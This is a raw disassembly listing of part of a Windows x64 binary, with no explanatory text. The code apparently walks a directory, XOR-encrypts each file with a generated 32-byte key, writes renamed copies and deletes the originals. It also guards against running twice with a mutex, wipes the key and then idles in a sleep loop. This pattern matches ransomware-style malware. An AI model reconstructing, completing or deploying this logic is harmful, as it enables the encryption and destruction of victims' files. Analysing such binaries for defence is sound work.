   140001e00:	49 89 d0             	mov    %rdx,%r8
   140001e03:	48 89 c2             	mov    %rax,%rdx
   140001e06:	e8 b5 f8 ff ff       	call   0x1400016c0
   140001e0b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001e0f:	48 89 c1             	mov    %rax,%rcx
   140001e12:	e8 91 82 00 00       	call   0x14000a0a8
   140001e17:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001e1c:	e9 30 01 00 00       	jmp    0x140001f51
   140001e21:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   140001e28:	e9 da 00 00 00       	jmp    0x140001f07
   140001e2d:	4c 8d 85 50 ff ff ff 	lea    -0xb0(%rbp),%r8
   140001e34:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140001e38:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140001e3b:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140001e3f:	4d 89 c1             	mov    %r8,%r9
   140001e42:	49 89 c8             	mov    %rcx,%r8
   140001e45:	48 89 c1             	mov    %rax,%rcx
   140001e48:	e8 a1 fb ff ff       	call   0x1400019ee
   140001e4d:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   140001e54:	00 
   140001e55:	e9 9b 00 00 00       	jmp    0x140001ef5
   140001e5a:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   140001e5e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001e62:	48 01 d0             	add    %rdx,%rax
   140001e65:	0f b6 08             	movzbl (%rax),%ecx
   140001e68:	48 8d 95 50 ff ff ff 	lea    -0xb0(%rbp),%rdx
   140001e6f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001e73:	48 01 d0             	add    %rdx,%rax
   140001e76:	0f b6 00             	movzbl (%rax),%eax
   140001e79:	31 c8                	xor    %ecx,%eax
   140001e7b:	88 45 d7             	mov    %al,-0x29(%rbp)
   140001e7e:	0f b6 45 d7          	movzbl -0x29(%rbp),%eax
   140001e82:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   140001e86:	89 c1                	mov    %eax,%ecx
   140001e88:	e8 3b 82 00 00       	call   0x14000a0c8
   140001e8d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001e90:	75 5e                	jne    0x140001ef0
   140001e92:	48 8b 05 c7 04 01 00 	mov    0x104c7(%rip),%rax        # 0x140012360
   140001e99:	ff d0                	call   *%rax
   140001e9b:	8b 00                	mov    (%rax),%eax
   140001e9d:	89 c1                	mov    %eax,%ecx
   140001e9f:	e8 7c 82 00 00       	call   0x14000a120
   140001ea4:	48 89 c3             	mov    %rax,%rbx
   140001ea7:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001eac:	48 8b 05 3d 92 00 00 	mov    0x923d(%rip),%rax        # 0x14000b0f0
   140001eb3:	ff d0                	call   *%rax
   140001eb5:	48 89 c1             	mov    %rax,%rcx
   140001eb8:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140001ebc:	48 8d 05 29 a2 00 00 	lea    0xa229(%rip),%rax        # 0x14000c0ec
   140001ec3:	49 89 d9             	mov    %rbx,%r9
   140001ec6:	49 89 d0             	mov    %rdx,%r8
   140001ec9:	48 89 c2             	mov    %rax,%rdx
   140001ecc:	e8 ef f7 ff ff       	call   0x1400016c0
   140001ed1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001ed5:	48 89 c1             	mov    %rax,%rcx
   140001ed8:	e8 cb 81 00 00       	call   0x14000a0a8
   140001edd:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140001ee1:	48 89 c1             	mov    %rax,%rcx
   140001ee4:	e8 bf 81 00 00       	call   0x14000a0a8
   140001ee9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001eee:	eb 61                	jmp    0x140001f51
   140001ef0:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
   140001ef5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001ef9:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
   140001efd:	0f 82 57 ff ff ff    	jb     0x140001e5a
   140001f03:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140001f07:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140001f0b:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   140001f0f:	49 89 d1             	mov    %rdx,%r9
   140001f12:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140001f18:	ba 01 00 00 00       	mov    $0x1,%edx
   140001f1d:	48 89 c1             	mov    %rax,%rcx
   140001f20:	e8 ab 81 00 00       	call   0x14000a0d0
   140001f25:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140001f29:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140001f2e:	0f 85 f9 fe ff ff    	jne    0x140001e2d
   140001f34:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001f38:	48 89 c1             	mov    %rax,%rcx
   140001f3b:	e8 68 81 00 00       	call   0x14000a0a8
   140001f40:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140001f44:	48 89 c1             	mov    %rax,%rcx
   140001f47:	e8 5c 81 00 00       	call   0x14000a0a8
   140001f4c:	b8 00 00 00 00       	mov    $0x0,%eax
   140001f51:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
   140001f58:	5b                   	pop    %rbx
   140001f59:	5d                   	pop    %rbp
   140001f5a:	c3                   	ret
   140001f5b:	55                   	push   %rbp
   140001f5c:	48 89 e5             	mov    %rsp,%rbp
   140001f5f:	48 83 ec 30          	sub    $0x30,%rsp
   140001f63:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001f67:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001f6b:	48 89 c1             	mov    %rax,%rcx
   140001f6e:	e8 b5 81 00 00       	call   0x14000a128
   140001f73:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140001f77:	48 83 7d f8 04       	cmpq   $0x4,-0x8(%rbp)
   140001f7c:	76 29                	jbe    0x140001fa7
   140001f7e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140001f82:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
   140001f86:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001f8a:	48 01 d0             	add    %rdx,%rax
   140001f8d:	48 8d 15 71 a1 00 00 	lea    0xa171(%rip),%rdx        # 0x14000c105
   140001f94:	48 89 c1             	mov    %rax,%rcx
   140001f97:	e8 7c 81 00 00       	call   0x14000a118
   140001f9c:	85 c0                	test   %eax,%eax
   140001f9e:	75 07                	jne    0x140001fa7
   140001fa0:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fa5:	eb 4c                	jmp    0x140001ff3
   140001fa7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001fab:	0f b6 00             	movzbl (%rax),%eax
   140001fae:	3c 2e                	cmp    $0x2e,%al
   140001fb0:	75 07                	jne    0x140001fb9
   140001fb2:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fb7:	eb 3a                	jmp    0x140001ff3
   140001fb9:	48 8d 15 4a a1 00 00 	lea    0xa14a(%rip),%rdx        # 0x14000c10a
   140001fc0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001fc4:	48 89 c1             	mov    %rax,%rcx
   140001fc7:	e8 4c 81 00 00       	call   0x14000a118
   140001fcc:	85 c0                	test   %eax,%eax
   140001fce:	74 17                	je     0x140001fe7
   140001fd0:	48 8d 15 3b a1 00 00 	lea    0xa13b(%rip),%rdx        # 0x14000c112
   140001fd7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001fdb:	48 89 c1             	mov    %rax,%rcx
   140001fde:	e8 35 81 00 00       	call   0x14000a118
   140001fe3:	85 c0                	test   %eax,%eax
   140001fe5:	75 07                	jne    0x140001fee
   140001fe7:	b8 01 00 00 00       	mov    $0x1,%eax
   140001fec:	eb 05                	jmp    0x140001ff3
   140001fee:	b8 00 00 00 00       	mov    $0x0,%eax
   140001ff3:	48 83 c4 30          	add    $0x30,%rsp
   140001ff7:	5d                   	pop    %rbp
   140001ff8:	c3                   	ret
   140001ff9:	55                   	push   %rbp
   140001ffa:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   140002001:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140002008:	00 
   140002009:	48 89 8d 10 05 00 00 	mov    %rcx,0x510(%rbp)
   140002010:	48 89 95 18 05 00 00 	mov    %rdx,0x518(%rbp)
   140002017:	c7 85 fc 04 00 00 00 	movl   $0x0,0x4fc(%rbp)
   14000201e:	00 00 00 
   140002021:	c7 85 f8 04 00 00 00 	movl   $0x0,0x4f8(%rbp)
   140002028:	00 00 00 
   14000202b:	48 8d 05 ee a0 00 00 	lea    0xa0ee(%rip),%rax        # 0x14000c120
   140002032:	48 89 c1             	mov    %rax,%rcx
   140002035:	e8 c9 f6 ff ff       	call   0x140001703
   14000203a:	48 8d 85 b0 03 00 00 	lea    0x3b0(%rbp),%rax
   140002041:	48 8d 0d 03 a1 00 00 	lea    0xa103(%rip),%rcx        # 0x14000c14b
   140002048:	48 89 c2             	mov    %rax,%rdx
   14000204b:	48 8b 05 1e 02 01 00 	mov    0x1021e(%rip),%rax        # 0x140012270
   140002052:	ff d0                	call   *%rax
   140002054:	48 89 85 f0 04 00 00 	mov    %rax,0x4f0(%rbp)
   14000205b:	48 83 bd f0 04 00 00 	cmpq   $0xffffffffffffffff,0x4f0(%rbp)
   140002062:	ff 
   140002063:	75 2a                	jne    0x14000208f
   140002065:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000206a:	48 8b 05 7f 90 00 00 	mov    0x907f(%rip),%rax        # 0x14000b0f0
   140002071:	ff d0                	call   *%rax
   140002073:	48 89 c1             	mov    %rax,%rcx
   140002076:	48 8d 05 d3 a0 00 00 	lea    0xa0d3(%rip),%rax        # 0x14000c150
   14000207d:	48 89 c2             	mov    %rax,%rdx
   140002080:	e8 3b f6 ff ff       	call   0x1400016c0
   140002085:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000208a:	e9 85 01 00 00       	jmp    0x140002214
   14000208f:	8b 85 b0 03 00 00    	mov    0x3b0(%rbp),%eax
   140002095:	83 e0 10             	and    $0x10,%eax
   140002098:	85 c0                	test   %eax,%eax
   14000209a:	0f 85 26 01 00 00    	jne    0x1400021c6
   1400020a0:	48 8d 85 b0 03 00 00 	lea    0x3b0(%rbp),%rax
   1400020a7:	48 83 c0 2c          	add    $0x2c,%rax
   1400020ab:	48 89 c1             	mov    %rax,%rcx
   1400020ae:	e8 a8 fe ff ff       	call   0x140001f5b
   1400020b3:	85 c0                	test   %eax,%eax
   1400020b5:	0f 85 0e 01 00 00    	jne    0x1400021c9
   1400020bb:	48 8d 85 b0 03 00 00 	lea    0x3b0(%rbp),%rax
   1400020c2:	4c 8d 40 2c          	lea    0x2c(%rax),%r8
   1400020c6:	48 8d 0d a2 a0 00 00 	lea    0xa0a2(%rip),%rcx        # 0x14000c16f
   1400020cd:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   1400020d1:	48 8d 15 2d a0 00 00 	lea    0xa02d(%rip),%rdx        # 0x14000c105
   1400020d8:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400020dd:	4d 89 c1             	mov    %r8,%r9
   1400020e0:	49 89 c8             	mov    %rcx,%r8
   1400020e3:	ba 00 04 00 00       	mov    $0x400,%edx
   1400020e8:	48 89 c1             	mov    %rax,%rcx
   1400020eb:	e8 67 f6 ff ff       	call   0x140001757
   1400020f0:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400020f4:	48 8d 85 b0 03 00 00 	lea    0x3b0(%rbp),%rax
   1400020fb:	48 8d 50 2c          	lea    0x2c(%rax),%rdx
   1400020ff:	48 8d 05 6e a0 00 00 	lea    0xa06e(%rip),%rax        # 0x14000c174
   140002106:	49 89 c8             	mov    %rcx,%r8
   140002109:	48 89 c1             	mov    %rax,%rcx
   14000210c:	e8 f2 f5 ff ff       	call   0x140001703
   140002111:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002116:	48 8b 05 d3 8f 00 00 	mov    0x8fd3(%rip),%rax        # 0x14000b0f0
   14000211d:	ff d0                	call   *%rax
   14000211f:	48 89 c1             	mov    %rax,%rcx
   140002122:	e8 89 7f 00 00       	call   0x14000a0b0
   140002127:	4c 8b 8d 18 05 00 00 	mov    0x518(%rbp),%r9
   14000212e:	4c 8b 85 10 05 00 00 	mov    0x510(%rbp),%r8
   140002135:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140002139:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   140002140:	48 8d 4a 2c          	lea    0x2c(%rdx),%rcx
   140002144:	48 89 c2             	mov    %rax,%rdx
   140002147:	e8 da fb ff ff       	call   0x140001d26
   14000214c:	85 c0                	test   %eax,%eax
   14000214e:	75 5e                	jne    0x1400021ae
   140002150:	48 8d 05 33 a0 00 00 	lea    0xa033(%rip),%rax        # 0x14000c18a
   140002157:	48 89 c1             	mov    %rax,%rcx
   14000215a:	e8 a4 f5 ff ff       	call   0x140001703
   14000215f:	83 85 fc 04 00 00 01 	addl   $0x1,0x4fc(%rbp)
   140002166:	48 8d 85 b0 03 00 00 	lea    0x3b0(%rbp),%rax
   14000216d:	48 83 c0 2c          	add    $0x2c,%rax
   140002171:	48 89 c1             	mov    %rax,%rcx
   140002174:	e8 8f 7f 00 00       	call   0x14000a108
   140002179:	85 c0                	test   %eax,%eax
   14000217b:	75 11                	jne    0x14000218e
   14000217d:	48 8d 05 0b a0 00 00 	lea    0xa00b(%rip),%rax        # 0x14000c18f
   140002184:	48 89 c1             	mov    %rax,%rcx
   140002187:	e8 77 f5 ff ff       	call   0x140001703
   14000218c:	eb 0f                	jmp    0x14000219d
   14000218e:	48 8d 05 13 a0 00 00 	lea    0xa013(%rip),%rax        # 0x14000c1a8
   140002195:	48 89 c1             	mov    %rax,%rcx
   140002198:	e8 66 f5 ff ff       	call   0x140001703
   14000219d:	48 8d 05 2a a0 00 00 	lea    0xa02a(%rip),%rax        # 0x14000c1ce
   1400021a4:	48 89 c1             	mov    %rax,%rcx
   1400021a7:	e8 57 f5 ff ff       	call   0x140001703
   1400021ac:	eb 1c                	jmp    0x1400021ca
   1400021ae:	48 8d 05 1b a0 00 00 	lea    0xa01b(%rip),%rax        # 0x14000c1d0
   1400021b5:	48 89 c1             	mov    %rax,%rcx
   1400021b8:	e8 46 f5 ff ff       	call   0x140001703
   1400021bd:	83 85 f8 04 00 00 01 	addl   $0x1,0x4f8(%rbp)
   1400021c4:	eb 04                	jmp    0x1400021ca
   1400021c6:	90                   	nop
   1400021c7:	eb 01                	jmp    0x1400021ca
   1400021c9:	90                   	nop
   1400021ca:	48 8d 95 b0 03 00 00 	lea    0x3b0(%rbp),%rdx
   1400021d1:	48 8b 85 f0 04 00 00 	mov    0x4f0(%rbp),%rax
   1400021d8:	48 89 c1             	mov    %rax,%rcx
   1400021db:	48 8b 05 96 00 01 00 	mov    0x10096(%rip),%rax        # 0x140012278
   1400021e2:	ff d0                	call   *%rax
   1400021e4:	85 c0                	test   %eax,%eax
   1400021e6:	0f 85 a3 fe ff ff    	jne    0x14000208f
   1400021ec:	48 8b 85 f0 04 00 00 	mov    0x4f0(%rbp),%rax
   1400021f3:	48 89 c1             	mov    %rax,%rcx
   1400021f6:	48 8b 05 6b 00 01 00 	mov    0x1006b(%rip),%rax        # 0x140012268
   1400021fd:	ff d0                	call   *%rax
   1400021ff:	83 bd f8 04 00 00 00 	cmpl   $0x0,0x4f8(%rbp)
   140002206:	7e 07                	jle    0x14000220f
   140002208:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000220d:	eb 05                	jmp    0x140002214
   14000220f:	b8 00 00 00 00       	mov    $0x0,%eax
   140002214:	48 81 c4 80 05 00 00 	add    $0x580,%rsp
   14000221b:	5d                   	pop    %rbp
   14000221c:	c3                   	ret
   14000221d:	55                   	push   %rbp
   14000221e:	48 89 e5             	mov    %rsp,%rbp
   140002221:	48 83 ec 20          	sub    $0x20,%rsp
   140002225:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140002229:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000222d:	49 89 c0             	mov    %rax,%r8
   140002230:	ba 01 00 00 00       	mov    $0x1,%edx
   140002235:	b9 00 00 00 00       	mov    $0x0,%ecx
   14000223a:	48 8b 05 0f 00 01 00 	mov    0x1000f(%rip),%rax        # 0x140012250
   140002241:	ff d0                	call   *%rax
   140002243:	48 89 05 56 ee 00 00 	mov    %rax,0xee56(%rip)        # 0x1400110a0
   14000224a:	48 8b 05 4f ee 00 00 	mov    0xee4f(%rip),%rax        # 0x1400110a0
   140002251:	48 85 c0             	test   %rax,%rax
   140002254:	75 07                	jne    0x14000225d
   140002256:	b8 00 00 00 00       	mov    $0x0,%eax
   14000225b:	eb 3a                	jmp    0x140002297
   14000225d:	48 8b 05 24 00 01 00 	mov    0x10024(%rip),%rax        # 0x140012288
   140002264:	ff d0                	call   *%rax
   140002266:	3d b7 00 00 00       	cmp    $0xb7,%eax
   14000226b:	75 25                	jne    0x140002292
   14000226d:	48 8b 05 2c ee 00 00 	mov    0xee2c(%rip),%rax        # 0x1400110a0
   140002274:	48 89 c1             	mov    %rax,%rcx
   140002277:	48 8b 05 ca ff 00 00 	mov    0xffca(%rip),%rax        # 0x140012248
   14000227e:	ff d0                	call   *%rax
   140002280:	48 c7 05 15 ee 00 00 	movq   $0x0,0xee15(%rip)        # 0x1400110a0
   140002287:	00 00 00 00 
   14000228b:	b8 00 00 00 00       	mov    $0x0,%eax
   140002290:	eb 05                	jmp    0x140002297
   140002292:	b8 01 00 00 00       	mov    $0x1,%eax
   140002297:	48 83 c4 20          	add    $0x20,%rsp
   14000229b:	5d                   	pop    %rbp
   14000229c:	c3                   	ret
   14000229d:	55                   	push   %rbp
   14000229e:	48 89 e5             	mov    %rsp,%rbp
   1400022a1:	48 83 ec 20          	sub    $0x20,%rsp
   1400022a5:	48 8b 05 f4 ed 00 00 	mov    0xedf4(%rip),%rax        # 0x1400110a0
   1400022ac:	48 85 c0             	test   %rax,%rax
   1400022af:	74 31                	je     0x1400022e2
   1400022b1:	48 8b 05 e8 ed 00 00 	mov    0xede8(%rip),%rax        # 0x1400110a0
   1400022b8:	48 89 c1             	mov    %rax,%rcx
   1400022bb:	48 8b 05 06 00 01 00 	mov    0x10006(%rip),%rax        # 0x1400122c8
   1400022c2:	ff d0                	call   *%rax
   1400022c4:	48 8b 05 d5 ed 00 00 	mov    0xedd5(%rip),%rax        # 0x1400110a0
   1400022cb:	48 89 c1             	mov    %rax,%rcx
   1400022ce:	48 8b 05 73 ff 00 00 	mov    0xff73(%rip),%rax        # 0x140012248
   1400022d5:	ff d0                	call   *%rax
   1400022d7:	48 c7 05 be ed 00 00 	movq   $0x0,0xedbe(%rip)        # 0x1400110a0
   1400022de:	00 00 00 00 
   1400022e2:	90                   	nop
   1400022e3:	48 83 c4 20          	add    $0x20,%rsp
   1400022e7:	5d                   	pop    %rbp
   1400022e8:	c3                   	ret
   1400022e9:	55                   	push   %rbp
   1400022ea:	48 89 e5             	mov    %rsp,%rbp
   1400022ed:	48 83 ec 60          	sub    $0x60,%rsp
   1400022f1:	89 4d 10             	mov    %ecx,0x10(%rbp)
   1400022f4:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400022f8:	e8 4a 01 00 00       	call   0x140002447
   1400022fd:	48 8d 05 d6 9e 00 00 	lea    0x9ed6(%rip),%rax        # 0x14000c1da
   140002304:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002308:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000230c:	48 89 c1             	mov    %rax,%rcx
   14000230f:	e8 09 ff ff ff       	call   0x14000221d
   140002314:	85 c0                	test   %eax,%eax
   140002316:	75 07                	jne    0x14000231f
   140002318:	b8 01 00 00 00       	mov    $0x1,%eax
   14000231d:	eb 69                	jmp    0x140002388
   14000231f:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140002323:	48 89 c1             	mov    %rax,%rcx
   140002326:	e8 76 f4 ff ff       	call   0x1400017a1
   14000232b:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   14000232f:	48 89 c1             	mov    %rax,%rcx
   140002332:	e8 c2 f4 ff ff       	call   0x1400017f9
   140002337:	48 8d 55 c8          	lea    -0x38(%rbp),%rdx
   14000233b:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000233f:	48 89 c1             	mov    %rax,%rcx
   140002342:	e8 b2 fc ff ff       	call   0x140001ff9
   140002347:	89 45 f4             	mov    %eax,-0xc(%rbp)
   14000234a:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000234e:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140002354:	ba 00 00 00 00       	mov    $0x0,%edx
   140002359:	48 89 c1             	mov    %rax,%rcx
   14000235c:	e8 9f 7d 00 00       	call   0x14000a100
   140002361:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   140002365:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000236b:	ba 00 00 00 00       	mov    $0x0,%edx
   140002370:	48 89 c1             	mov    %rax,%rcx
   140002373:	e8 88 7d 00 00       	call   0x14000a100
   140002378:	b9 10 27 00 00       	mov    $0x2710,%ecx
   14000237d:	48 8b 05 54 ff 00 00 	mov    0xff54(%rip),%rax        # 0x1400122d8
   140002384:	ff d0                	call   *%rax
   140002386:	eb f0                	jmp    0x140002378
   140002388:	48 83 c4 60          	add    $0x60,%rsp
   14000238c:	5d                   	pop    %rbp
   14000238d:	c3                   	ret
   14000238e:	90                   	nop
   14000238f:	90                   	nop
   140002390:	55                   	push   %rbp
   140002391:	48 89 e5             	mov    %rsp,%rbp
   140002394:	48 83 ec 20          	sub    $0x20,%rsp
   140002398:	eb 1e                	jmp    0x1400023b8
   14000239a:	48 8b 05 6f 8c 00 00 	mov    0x8c6f(%rip),%rax        # 0x14000b010
   1400023a1:	48 8b 00             	mov    (%rax),%rax
   1400023a4:	ff d0                	call   *%rax
   1400023a6:	48 8b 05 63 8c 00 00 	mov    0x8c63(%rip),%rax        # 0x14000b010
   1400023ad:	48 83 c0 08          	add    $0x8,%rax
   1400023b1:	48 89 05 58 8c 00 00 	mov    %rax,0x8c58(%rip)        # 0x14000b010
   1400023b8:	48 8b 05 51 8c 00 00 	mov    0x8c51(%rip),%rax        # 0x14000b010
   1400023bf:	48 8b 00             	mov    (%rax),%rax
   1400023c2:	48 85 c0             	test   %rax,%rax
   1400023c5:	75 d3                	jne    0x14000239a
   1400023c7:	90                   	nop
   1400023c8:	90                   	nop
   1400023c9:	48 83 c4 20          	add    $0x20,%rsp
   1400023cd:	5d                   	pop    %rbp
   1400023ce:	c3                   	ret
   1400023cf:	55                   	push   %rbp
   1400023d0:	48 89 e5             	mov    %rsp,%rbp
   1400023d3:	48 83 ec 30          	sub    $0x30,%rsp
   1400023d7:	48 8b 05 02 a3 00 00 	mov    0xa302(%rip),%rax        # 0x14000c6e0
   1400023de:	48 8b 00             	mov    (%rax),%rax
   1400023e1:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400023e4:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%rbp)
   1400023e8:	75 25                	jne    0x14000240f
   1400023ea:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400023f1:	eb 04                	jmp    0x1400023f7
   1400023f3:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   1400023f7:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400023fa:	8d 50 01             	lea    0x1(%rax),%edx
   1400023fd:	48 8b 05 dc a2 00 00 	mov    0xa2dc(%rip),%rax        # 0x14000c6e0
   140002404:	89 d2                	mov    %edx,%edx
   140002406:	48 8b 04 d0          	mov    (%rax,%rdx,8),%rax
   14000240a:	48 85 c0             	test   %rax,%rax
   14000240d:	75 e4                	jne    0x1400023f3
   14000240f:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002412:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140002415:	eb 14                	jmp    0x14000242b
   140002417:	48 8b 05 c2 a2 00 00 	mov    0xa2c2(%rip),%rax        # 0x14000c6e0
   14000241e:	8b 55 f8             	mov    -0x8(%rbp),%edx
   140002421:	48 8b 04 d0          	mov    (%rax,%rdx,8),%rax
   140002425:	ff d0                	call   *%rax
   140002427:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
   14000242b:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   14000242f:	75 e6                	jne    0x140002417
   140002431:	48 8d 05 58 ff ff ff 	lea    -0xa8(%rip),%rax        # 0x140002390
   140002438:	48 89 c1             	mov    %rax,%rcx
   14000243b:	e8 3e f1 ff ff       	call   0x14000157e
   140002440:	90                   	nop
   140002441:	48 83 c4 30          	add    $0x30,%rsp
   140002445:	5d                   	pop    %rbp
   140002446:	c3                   	ret
   140002447:	55                   	push   %rbp
   140002448:	48 89 e5             	mov    %rsp,%rbp
   14000244b:	48 83 ec 20          	sub    $0x20,%rsp
   14000244f:	8b 05 5b ec 00 00    	mov    0xec5b(%rip),%eax        # 0x1400110b0
   140002455:	85 c0                	test   %eax,%eax
   140002457:	75 0f                	jne    0x140002468
   140002459:	c7 05 4d ec 00 00 01 	movl   $0x1,0xec4d(%rip)        # 0x1400110b0
   140002460:	00 00 00 
   140002463:	e8 67 ff ff ff       	call   0x1400023cf
   140002468:	90                   	nop
   140002469:	48 83 c4 20          	add    $0x20,%rsp
   14000246d:	5d                   	pop    %rbp
   14000246e:	c3                   	ret
   14000246f:	90                   	nop
   140002470:	55                   	push   %rbp
   140002471:	48 89 e5             	mov    %rsp,%rbp
   140002474:	b8 00 00 00 00       	mov    $0x0,%eax
   140002479:	5d                   	pop    %rbp
   14000247a:	c3                   	ret
   14000247b:	90                   	nop
   14000247c:	90                   	nop
   14000247d:	90                   	nop
   14000247e:	90                   	nop
   14000247f:	90                   	nop
   140002480:	55                   	push   %rbp
   140002481:	48 89 e5             	mov    %rsp,%rbp
   140002484:	48 83 ec 30          	sub    $0x30,%rsp
   140002488:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000248c:	89 55 18             	mov    %edx,0x18(%rbp)
   14000248f:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140002493:	48 8b 05 26 a2 00 00 	mov    0xa226(%rip),%rax        # 0x14000c6c0
   14000249a:	8b 00                	mov    (%rax),%eax
   14000249c:	83 f8 02             	cmp    $0x2,%eax
   14000249f:	74 0d                	je     0x1400024ae
   1400024a1:	48 8b 05 18 a2 00 00 	mov    0xa218(%rip),%rax        # 0x14000c6c0
   1400024a8:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   1400024ae:	83 7d 18 02          	cmpl   $0x2,0x18(%rbp)
   1400024b2:	74 23                	je     0x1400024d7
   1400024b4:	83 7d 18 01          	cmpl   $0x1,0x18(%rbp)
   1400024b8:	75 16                	jne    0x1400024d0
   1400024ba:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400024be:	8b 55 18             	mov    0x18(%rbp),%edx
   1400024c1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400024c5:	49 89 c8             	mov    %rcx,%r8
   1400024c8:	48 89 c1             	mov    %rax,%rcx
   1400024cb:	e8 c1 0f 00 00       	call   0x140003491
   1400024d0:	b8 01 00 00 00       	mov    $0x1,%eax
   1400024d5:	eb 46                	jmp    0x14000251d
   1400024d7:	48 8d 05 9a b2 00 00 	lea    0xb29a(%rip),%rax        # 0x14000d778
   1400024de:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400024e2:	48 83 45 f8 08       	addq   $0x8,-0x8(%rbp)
   1400024e7:	eb 22                	jmp    0x14000250b
   1400024e9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400024ed:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400024f1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400024f5:	48 8b 00             	mov    (%rax),%rax
   1400024f8:	48 85 c0             	test   %rax,%rax
   1400024fb:	74 09                	je     0x140002506
   1400024fd:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002501:	48 8b 00             	mov    (%rax),%rax
   140002504:	ff d0                	call   *%rax
   140002506:	48 83 45 f8 08       	addq   $0x8,-0x8(%rbp)
   14000250b:	48 8d 05 6e b2 00 00 	lea    0xb26e(%rip),%rax        # 0x14000d780
   140002512:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
   140002516:	75 d1                	jne    0x1400024e9
   140002518:	b8 01 00 00 00       	mov    $0x1,%eax
   14000251d:	48 83 c4 30          	add    $0x30,%rsp
   140002521:	5d                   	pop    %rbp
   140002522:	c3                   	ret
   140002523:	55                   	push   %rbp
   140002524:	48 89 e5             	mov    %rsp,%rbp
   140002527:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000252b:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140002530:	75 07                	jne    0x140002539
   140002532:	b8 00 00 00 00       	mov    $0x0,%eax
   140002537:	eb 05                	jmp    0x14000253e
   140002539:	b8 00 00 00 00       	mov    $0x0,%eax
   14000253e:	5d                   	pop    %rbp
   14000253f:	c3                   	ret
   140002540:	55                   	push   %rbp
   140002541:	48 89 e5             	mov    %rsp,%rbp
   140002544:	48 83 ec 20          	sub    $0x20,%rsp
   140002548:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000254c:	89 55 18             	mov    %edx,0x18(%rbp)
